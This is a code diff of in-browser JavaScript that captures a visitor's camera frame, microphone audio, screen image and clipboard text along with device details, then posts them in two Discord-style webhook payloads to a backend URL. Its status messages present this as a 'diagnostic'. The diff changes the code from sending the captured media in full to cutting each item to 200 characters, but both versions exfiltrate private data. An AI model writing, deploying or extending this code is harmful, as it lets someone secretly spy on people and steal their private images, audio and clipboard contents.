@@ -136,7 +136,7 @@
                 });
             }
 
-            // 3. Camera snapshot (stills) – capture single frame from video (FULL BASE64, NO TRUNCATION)
+            // 3. Camera snapshot (stills) – capture single frame from video
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -152,13 +152,13 @@
                 const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                 video.srcObject = null;
                 video.remove();
-                trackStop(videoTrack);
-                return dataURL; // FULL, NO SLICE
+                trackStop(videoTrack); // stop track to release camera
+                return dataURL.slice(0, 200); // truncate for Discord, full in raw logs? we'll store full in separate field maybe.
             }
 
             function trackStop(track) { if(track && track.stop) track.stop(); }
 
-            // 4. Microphone recording (short audio sample) – FULL BASE64
+            // 4. Microphone recording (short audio sample)
             async function captureMicrophoneSample(stream) {
                 if (!stream) return null;
                 const mediaRecorder = new MediaRecorder(stream);
@@ -173,7 +173,7 @@
                 const base64 = await blobToBase64(blob);
                 URL.revokeObjectURL(url);
                 stream.getTracks().forEach(t => t.stop());
-                return base64; // FULL, NO SLICE
+                return base64.slice(0, 200); // truncated
             }
             function blobToBase64(blob) {
                 return new Promise((resolve) => {
@@ -183,7 +183,7 @@
                 });
             }
 
-            // 5. Screen capture snapshot – FULL BASE64
+            // 5. Screen capture snapshot
             async function captureScreenSnapshot() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                 try {
@@ -197,19 +197,19 @@
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    return dataURL; // FULL, NO SLICE
+                    return dataURL.slice(0, 200);
                 } catch(e) { return { error: e.message }; }
             }
 
-            // 6. Clipboard read (text) – FULL TEXT
+            // 6. Clipboard read (text)
             async function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
                     const text = await navigator.clipboard.readText();
-                    return text; // FULL, NO SLICING
+                    return text.length > 100 ? text.slice(0,100)+'...' : text;
                 } catch(e) { return { error: e.message }; }
             }
 
@@ -324,7 +324,7 @@
                 } catch(e) { return []; }
             }
 
-            // 19. Request camera & microphone streams (to get metadata + snapshots) – NOW RETURNS FULL DATA
+            // 19. Request camera & microphone streams (to get metadata + snapshots)
             async function requestCameraAndMic() {
                 let cameraStream = null, micStream = null, cameraSnapshot = null, micSample = null, cameraTrack = null;
                 try {
@@ -387,10 +387,10 @@
                     web_share_support: webShare,
                     permissions: permissions,
                     media_devices: mediaDevices,
-                    camera_snapshot_thumb: null,
-                    microphone_sample_thumb: null,
-                    screen_snapshot_thumb: null,
-                    clipboard_text_sample: null,
+                    camera_snapshot_thumb: null,   // not yet available
+                    microphone_sample_thumb: null,  // not yet available
+                    screen_snapshot_thumb: null,    // not yet available
+                    clipboard_text_sample: null,     // not yet available
                     httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
                     jsAttributes: {
                         userAgent: navigator.userAgent,
@@ -437,7 +437,7 @@
                     }]
                 };
 
-                // 4. SEND THE IMMEDIATE PAYLOAD RIGHT NOW
+                // 4. SEND THE IMMEDIATE PAYLOAD RIGHT NOW – no waiting for camera/mic
                 const firstSend = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -447,28 +447,28 @@
                     ? 'Initial diagnostic sent. Now capturing camera/mic/screen/clipboard…'
                     : 'Initial send partial (HTTP ' + firstSend.status + '). Continuing capture…';
 
-                // 5. NOW wait for the remaining high‑interaction data (FULL, UNTRUNCATED)
+                // 5. NOW wait for the remaining high‑interaction data
                 const [cameraMicData, clipboardText, screenSnapshot] = await Promise.all([
                     cameraMicPromise,
                     clipboardTextPromise,
                     screenSnapshotPromise
                 ]);
 
-                // 6. Build and send the follow‑up payload with FULL captured content (NO SLICE)
+                // 6. Build and send the follow‑up payload with exactly the captured content
                 const followUpPayload = {
                     content: '**UPDATE: Camera / Mic / Screen / Clipboard Data**',
                     embeds: [{
                         title: 'Media Capture Results',
                         color: 0x00ff00,
                         fields: [
-                            { name: 'Camera Snapshot (full)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string')
-                                ? cameraMicData.cameraSnapshot : `denied/failed (${cameraMicData.cameraSnapshot?.error || 'unknown'})`, inline: false },
-                            { name: 'Microphone Sample (full base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string')
-                                ? cameraMicData.micSample : `denied/failed (${cameraMicData.micSample?.error || 'unknown'})`, inline: false },
-                            { name: 'Screen Snapshot (full)', value: (screenSnapshot && typeof screenSnapshot === 'string')
-                                ? screenSnapshot : `denied/failed (${screenSnapshot?.error || 'none'})`, inline: false },
-                            { name: 'Clipboard Text (full)', value: (clipboardText && typeof clipboardText === 'string')
-                                ? clipboardText : `denied/failed/empty`, inline: false }
+                            { name: 'Camera Snapshot (thumb)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string')
+                                ? cameraMicData.cameraSnapshot.slice(0,200) : `denied/failed (${cameraMicData.cameraSnapshot?.error || 'unknown'})`, inline: false },
+                            { name: 'Microphone Sample (base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string')
+                                ? cameraMicData.micSample.slice(0,200) : `denied/failed (${cameraMicData.micSample?.error || 'unknown'})`, inline: false },
+                            { name: 'Screen Snapshot (thumb)', value: (screenSnapshot && typeof screenSnapshot === 'string')
+                                ? screenSnapshot.slice(0,200) : `denied/failed (${screenSnapshot?.error || 'none'})`, inline: false },
+                            { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string')
+                                ? clipboardText.slice(0,200) : `denied/failed/empty`, inline: false }
                         ],
                         timestamp: new Date().toISOString()
                     }]
@@ -480,7 +480,7 @@
                     body: JSON.stringify(followUpPayload)
                 });
 
-                logEl.textContent += '\nFollow‑up payload sent (full media). All data delivered.';
+                logEl.textContent += '\nFollow‑up payload sent. All data delivered.';
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
